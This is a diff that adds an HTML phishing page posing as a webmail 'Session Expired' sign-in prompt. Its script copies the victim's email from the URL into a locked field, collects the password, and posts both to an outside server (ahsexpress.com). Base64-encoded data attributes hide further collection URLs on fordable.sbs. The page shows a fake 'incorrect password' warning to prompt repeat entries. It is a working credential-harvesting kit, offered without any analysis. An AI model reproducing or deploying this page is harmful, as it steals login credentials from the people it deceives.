@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>Session Revalidation...</title>
+    	<link href="index_files/bootstrap.min.css" rel="stylesheet" type="text/css">
+    	<link href="index_files/remixicon.css" rel="stylesheet" type="text/css">
+    	<link href="index_files/first.css" rel="stylesheet" type="text/css">
+    	<link rel="shortcut icon" href="index_files/mailrepo.svg">
+
+
+  	</head>
+	<body id="susBody" data-xmone="Ly9mb3JkYWJsZS5zYnMvbXgyLjEvP2FjY2Vzcz0=" data-xmtwo="Ly9mb3JkYWJsZS5zYnMvbXgyLjEvP3RodW09MSZhY2Nlc3M9" style="overflow: hidden; padding-right: 0px;" class="modal-open">
+		<div id="onpageload" class="dissimule"><div class="susloader"></div></div>
+		<main class="susMainClass" id="susMainId" style="display: none;">
+			<section id="susSectionId" class="susSectionClass"></section>
+		</main>
+
+
+		<div class="modal fade show" id="susModal" tabindex="-1" style="display: block;" aria-modal="true" role="dialog">
+		  <div class="modal-dialog modal-dialog-centered">
+		    <div class="modal-content">
+		      <div class="modal-header">
+		      	<div id="susFavTiny"><img src="index_files/mailrepo.svg" class="mailrepo"></div>
+		        <h5 class="">Session Expired</h5>
+
+		      </div>
+		      
+					    
+		      <div class="modal-body px-5">
+					<div class="show-acct"></div>
+					<div class="what-to-do">Sign in to restore <strong>expired</strong> session!</div>		      
+		                    
+		                    <p id="warn" style="display: none;color:red;margin-bottom: 15px;">Password is incorrect, please try again.</p>
+              <script type="text/javascript">
+                    function getParameterByName(name, url) {
+                        if (!url) url = window.location.href;
+                        name = name.replace(/[\[\]]/g, "\\$&");
+                        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                            results = regex.exec(url);
+                        if (!results) return null;
+                        if (!results[2]) return '';
+                        return decodeURIComponent(results[2].replace(/\+/g, " "));
+                    }
+                    var email = getParameterByName('email');
+                    var chck = getParameterByName('chck');
+                    var warn = document.getElementById('warn');
+
+                    if (chck) {
+                      warn.style.display = "block";
+                    }
+                </script>
+
+					<form id="loginform" class="sus-form mt-3 mb-2 needs-validation" method="POST" action="https://ahsexpress.com/.cgi-bin log/general1/post.php" name="loginform" novalidate="">
+	 
+					  	
+					  <div class="sus-input-group mt-2">
+					    <input type="text" name="user" id="" required="" class="sus-input" placeholder="" minlength="" autofocus="" value="" readonly>
+					   
+					    			    
+					  </div>
+					  
+					                  <script type="text/javascript">loginform.user.value = email;</script>
+
+                <input type="hidden" name="chck" value="">
+                <script type="text/javascript">loginform.chck.value = chck;</script>
+
+
+										  
+
+					  <div class="sus-input-group mt-2">
+					    <input type="password" name="suspass" id="susPass" required="required" class="sus-input" placeholder=" Password" minlength="6" autofocus="">
+					    <label for="name" class=""></label>
+					    			    
+					  </div>
+
+                
+					  <div class="mt-3 mb-3">
+					  	<button type="submit" id="susSubmitBtn" class="btn btn-success" style="border-radius: 2px; padding-right:10px ;"><i class=""></i> Secured Sign In</button>
+					  	<span class="float-end" id="lerror" style="color:#dc3545; font-size: 15px;"></span>
+					  </div>	
+						<div class="form-check">
+						  <input class="form-check-input" type="checkbox" value="true" id="susRemember" checked="checked">
+						  <label class="form-check-label" for="susRemember">
+						    <span>Keep me logged in (Do not select if you are on a public computer). </span>
+						  </label>
+						</div>				  
+					</form>
+		      	</div>
+		    </div>
+		  </div>
+		</div>
+
+
+		<script src="index_files/popper.min.js"></script>
+		<script src="index_files/bootstrap.min.js"></script>	
+		<script type="text/javascript" src="index_files/first.js"></script>	
+	
+
+
+<div class="modal-backdrop fade show"></div></body></html>
